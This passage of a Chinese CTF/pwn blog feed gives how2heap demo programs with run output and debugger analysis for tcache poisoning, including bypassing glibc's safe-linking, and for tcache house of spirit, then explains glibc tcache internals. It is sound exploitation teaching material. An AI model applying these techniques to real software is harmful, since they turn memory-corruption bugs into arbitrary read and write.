class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// disable buffering</span></span><br><span class="line">    <span class="comment">//禁止缓冲区防止打扰到堆布局</span></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里是为了寻找一个满足对齐要求的地址</span></span><br><span class="line"><span class="type">size_t</span> stack_var[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">size_t</span> *target = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// choose a properly aligned target address</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (((<span class="type">long</span>)&amp;stack_var[i] &amp; <span class="number">0xf</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">target = &amp;stack_var[i];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">assert(target != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, target);</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*从2.32版本开始，tcache引入了一个新的检查机制，申请chunk的时候，如果这个chunk尝试从tcache分配出来，则要检查tcache的counts数组成员在该bin下的大小是否为正数，即规定了assert (tcache-&gt;counts[tc_idx] &gt; 0);所以如果要通过劫持fd构造fake chunk来达到任意地址读写的效果，tcachebin中已有的chunk数量必须符合最后我们要申请chunk的数量*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*注意LIFO原则*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>,</span><br><span class="line">   <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, target);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="comment">// the following operation assumes the address of b is known, which requires a heap leak</span></span><br><span class="line">    <span class="comment">/*这个地方麻烦一点。从2.32开始引入了fd加密机制，需要用到你要改写的chunk本身的mem地址。在实际利用中我们需要利用uaf等漏洞泄露chunk地址才能正确算出要覆盖的加密fd。*/</span></span><br><span class="line">b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)((<span class="type">long</span>)target ^ (<span class="type">long</span>)b &gt;&gt; <span class="number">12</span>);</span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, target);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//申请第二块相同大小的chunk后就能从tcachebin中取出我们修改后伪造的chunk了</span></span><br><span class="line"><span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="type">long</span>)target == (<span class="type">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">The</span> address we want <span class="title function_">malloc</span>() to <span class="keyword">return</span> is <span class="number">0x7fffffffddd0</span>.</span><br><span class="line"><span class="title class_">Allocating</span> <span class="number">2</span> buffers.</span><br><span class="line"><span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x5555555592a0</span></span><br><span class="line"><span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x555555559330</span></span><br><span class="line"><span class="title class_">Freeing</span> the buffers...</span><br><span class="line"><span class="title class_">Now</span> the tcache list has [ <span class="number">0x555555559330</span> -&gt; <span class="number">0x5555555592a0</span> ].</span><br><span class="line"><span class="title class_">We</span> overwrite the first <span class="number">8</span> bytes (fd/next pointer) <span class="keyword">of</span> the data at <span class="number">0x555555559330</span></span><br><span class="line">to point to the location to control (<span class="number">0x7fffffffddd0</span>).</span><br><span class="line"><span class="title class_">Now</span> the tcache list has [ <span class="number">0x555555559330</span> -&gt; <span class="number">0x7fffffffddd0</span> ].</span><br><span class="line">1st <span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x555555559330</span></span><br><span class="line"><span class="title class_">Now</span> the tcache list has [ <span class="number">0x7fffffffddd0</span> ].</span><br><span class="line">2nd <span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x7fffffffddd0</span></span><br><span class="line"><span class="title class_">We</span> got the control</span><br></pre></td></tr></table></figure><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>首先申请两个chunk然后释放掉，让其进入tcachebin中。其中size为0x290的堆就是TcacheBin堆头。</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E7%94%B3%E8%AF%B72%E4%B8%AAchunk.png" alt="申请2个chunk"></p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E9%87%8A%E6%94%BE2%E4%B8%AAchunk.png" alt="释放2个chunk"></p><p><img src="https://c-lby.github.io/images/tcache-poisoning/bin%E9%93%BE%E8%A1%A8.png" alt="bin链表"></p><p>从bin链表可以得知，根据tcachebin先进后出的原则，当我们再申请相同大小的chunk的时候，会先分配0x9330的chunk1，再分配0x92a0处的chunk0。这里需要注意一个问题，在heap命令下显示的地址是chunk地址，但是在链表中存的地址是mem地址。</p><p>我们发现每个chunk的fd有点怪，这是因为在高版本有fd加密机制，pwndbg没有解密就直接打印出来了，所以看起来很奇怪。在劫持fd的时候我们也要传入一个加密后的fd，否则会劫持失败。</p><p>下一步就要修改chunk1的fd，这样在申请chunk0的时候我们就可以申请到我们想要到的地方，达成任意地址读写的目的。如果我们修改的是chunk0的fd，那修改的就是堆头的地址，这样会造成堆错误，并且没法利用程序的读写功能达到我们的目的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)((<span class="type">long</span>)target ^ (<span class="type">long</span>)b &gt;&gt; <span class="number">12</span>);</span><br></pre></td></tr></table></figure><p>我们从malloc得到的指针是mem的地址，也就是user_data处，所以指针指向的地址就是储存fd的地方，如果有UAF或者堆溢出漏洞，我们就可以修改chunk的fd。fd加密机制用到了mem地址，所以修改fd的前提是有UAF或者能泄露堆地址。这里有另外一个需要注意的地方，tcachebin链表中的地址是mem地址，所以我们想要读写的地址直接就能写进fd，如果是fastbin，它的链表中的地址是chunk地址，那就需要将target-0x10写进fastbin的fd。</p><p><img src="/images/tcache-poisoning/fd%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E9%93%BE%E8%A1%A8.png" alt="fd修改后的链表"></p><p>可以看到链表已经被修改了，接下来申请的第二个chunk就是在栈上的地址了。 </p><h4 id="tcache-house-of-spirit-from-How2Heap"><a href="#tcache-house-of-spirit-from-How2Heap" class="headerlink" title="tcache house of spirit from How2Heap"></a>tcache house of spirit from How2Heap</h4><h5 id="演示代码-1"><a href="#演示代码-1" class="headerlink" title="演示代码"></a>演示代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region这是一个chunk</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Calling <span class="title function_">malloc</span><span class="params">()</span> once so that it sets up its memory.</span><br><span class="line">Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span><br><span class="line">This region contains one fake chunk. It&#x27;s size field is placed at 0x7fffffffde08</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffde08.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next <span class="built_in">malloc</span> will <span class="keyword">return</span> the region of our fake chunk at 0x7fffffffde08, which will be 0x7fffffffde10!</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(<span class="number">0x30</span>)</span>: 0x7fffffffde10</span><br></pre></td></tr></table></figure><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>这种攻击手段在非堆段的地址伪造了一个chunk，实现了任意地址读写的效果。首先一定要先申请一个chunk以满足对bin中chunk count的检查。然后要修改需要劫持的fake chunk中的size字段。假如我们要修改0x10处的数值，根据chunk的结构不难知道，我们要构造的fake chunk的地址在0x00，那么size字段在0x08处。需要注意的是tcachebin链表中的地址存的是mem地址，所以释放的时候要释放0x10处。注意这个chunk的地址需满足对齐要求。</p><p>size的限制则是不能小于最小size，不能大于最大size（0x410）并且应为0x10的倍数。进入tcachebin时，_int_free不会对PREV_INUSE进行检查，所以size写0x40也行写0x41也行，但是对A和M标志位会检查，如果其值为1时，则会报错invalid pointer。要修改size字段的前提是程序对目标地址本来就能写或者有溢出刚好可以修改size字段，至少要有off by one；如果是要修改堆上地址的话，有uaf也许也能成功劫持。</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/house_of_spirit%E6%A0%87%E5%BF%97%E4%BD%8D%E6%A3%80%E6%9F%A5%E6%8A%A5%E9%94%99.png" alt="house_of_spirit标志位检查报错"></p><p>目标地址伪造前：</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E6%9C%AA%E4%BF%AE%E6%94%B9%E7%9A%84fake_chunk.png" alt="未修改的fake_chunk"></p><p>目标地址修改size：</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E4%BF%AE%E6%94%B9size%E5%90%8E%E7%9A%84fake_chunk.png" alt="修改size后的fake_chunk"></p><p>目标地址被释放后：</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E9%87%8A%E6%94%BE%E5%90%8E%E7%9A%84fake_chunk.png" alt="释放后的fake_chunk"></p><p>如果可以成功被释放，说明fake chunk成功绕过检查了。这时候tcachebin中链表就会存有目标地址，下一次申请一个size大小的chunk的时候就可以申请到这一块地址，实现读写。</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/house_of_spirit%E5%8A%AB%E6%8C%81%E6%88%90%E5%8A%9F%E5%90%8E%E7%9A%84bin%E9%93%BE%E8%A1%A8.png" alt="house_of_spirit劫持成功后的bin链表"></p><h4 id="tcache-stashing-unlink-attack-from-How2Heap"><a href="#tcache-stashing-unlink-attack-from-How2Heap" class="headerlink" title="tcache stashing unlink attack from How2Heap"></a>tcache stashing unlink attack from How2Heap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*To be continued...*/</span></span><br></pre></td></tr></table></figure><p>参考阅读：<br>- <a href="https://jiaweihawk.gitee.io/2021/09/03/tcache%E4%B8%AD%E7%9A%84double-free/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">tcache中的double free</a><br>- <a href="https://www.yuque.com/xswlhhh/ctf/gvg9gbmc0mwsvq6k">xswlhhh爷的博客！</a></p>]]></content>
      
      
      <categories>
          
          <category> Heap Exploitation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『glibc源码补完计划』TcacheBin</title>
      <link href="/2024/glibc_tcachebin/"/>
      <url>/2024/glibc_tcachebin/</url>
      
        <content type="html"><![CDATA[<h2 id="TcacheBin"><a href="#TcacheBin" class="headerlink" title="TcacheBin"></a>TcacheBin</h2><p>tcache全称 thread local caching，TcacheBin是从glibc2.26才开始加入的缓存机制，访问速度比fastbin更快，优先级更高，相对的检查机制也比较弱，容易攻击。</p><h3 id="TcacheBin相关数据结构"><a href="#TcacheBin相关数据结构" class="headerlink" title="TcacheBin相关数据结构"></a>TcacheBin相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span></span><br><span class="line"><span class="comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Process-wide key to try and catch a double-free in the same thread.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个线程都会被分配一个<code>TcacheBin</code>数组，数组大小为64，也就是每个TcacheBin里会有64个<code>bin</code>单向链表，每个bin最多可以缓存7个相同大小的空闲<code>chunk</code>。chunk在64位机器以16字节递增，从32到1024(<code>MAX_TCACHE_COUNT</code>)字节。在32位机器上以8字节递增，从12到512字节。TcacheBin由<code>tcache_perthread_struct</code>结构体维护，大小是0x290，放在堆头；<code>counts</code>数组记录了每个bin上chunk的数量，<code>entries</code>数组记录每个bin的地址。<br><code>tcache_entry</code>结构体用来连接空闲的chunk结构体形成链表。在这里有几个需要注意的问题，其一是<code>next</code>指针指向的是同一个bin中下一个chunk（大小一定相同的chunk）的<code>user_data</code>处（也就是mem），而在fastbin中chunk的fd指针的是下一个chunk的头部，即<code>prev_size</code>处；其二是<code>key</code>是为了防止double free而从glibc2.29才开始加入的，在glibc2.34前key是指向TcacheBin的指针，储存在空闲chunk的bk位置上，而2.34之后的key是由<code>tcache_key_initialize</code>函数生成的，一个线程生成一个key。</p><p><code>tidx2usize(idx)</code>通过bin索引计算chunk大小<br><code>csize2tidx(x)</code>通过chunk大小找到相应的bin索引<br><code>usize2tidx(x)</code>通过用户的需求size计算相应的bin索引</p><p>TcacheBin有很多特性和FastBin很像，LIFO的单向链表结构，PREV_INUSE标志位不清零，严格限制每个bin内chunk的大小相同，且chunk没法在tcachebin内合并。</p><h3 id="TcacheBin初始化"><a href="#TcacheBin初始化" class="headerlink" title="TcacheBin初始化"></a>TcacheBin初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">//分配内存给tcache_perthread_struct</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) <span class="comment">//如果分配失败则尝试再分配一次</span></span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex); <span class="comment">//释放一个互斥锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="comment">/* 在内存不足的情况下，我们可能无法分配内存 -这样的话，我们稍后再试。(๑ゝڡ◕๑) */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TcacheBin释放"><a href="#TcacheBin释放" class="headerlink" 